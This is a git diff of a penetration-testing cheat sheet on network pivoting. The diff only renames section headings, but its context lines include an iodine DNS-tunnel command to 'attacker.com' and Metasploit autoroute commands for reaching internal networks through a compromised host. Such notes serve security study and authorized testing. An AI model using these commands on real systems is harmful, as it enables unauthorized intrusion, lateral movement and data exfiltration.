@@ -17,11 +17,10 @@ Pivoting is a powerful technique in penetration testing that allows an attacker 
 - **DNS Tunneling** - Exfiltrating or tunneling data over DNS queries.
 
 --- 
-# Pre Pivot Steps
+# Pre Pivot 
 - ## Compromise an Initial Host
   - Gain access to an external system using exploits, phishing, or credentials.
   - Obtain a shell or remote desktop access.
-
 - ## Identify Network Interfaces
   - Check available interfaces and network connections:
     ```bash
@@ -30,7 +29,6 @@ Pivoting is a powerful technique in penetration testing that allows an attacker 
     ifconfig
     netstat -rn
     ```
-
   Identify internal IP ranges that may indicate private networks.
 
 - ## Enumerate Internal Network
@@ -92,7 +90,7 @@ Pivoting is a powerful technique in penetration testing that allows an attacker 
       - Use iodine to tunnel traffic over DNS: `iodine -f -P password -r attacker.com`
 
 ---
-# Additionaly could be done
+# Post Pivoting
 - ## Routing Traffic Through Compromised Host
   - Use Metasploit’s autoroute to configure routes: `run autoroute -s 10.10.0.0/24`
   - Scan the internal network from Metasploit: `run post/multi/manage/autoroute`
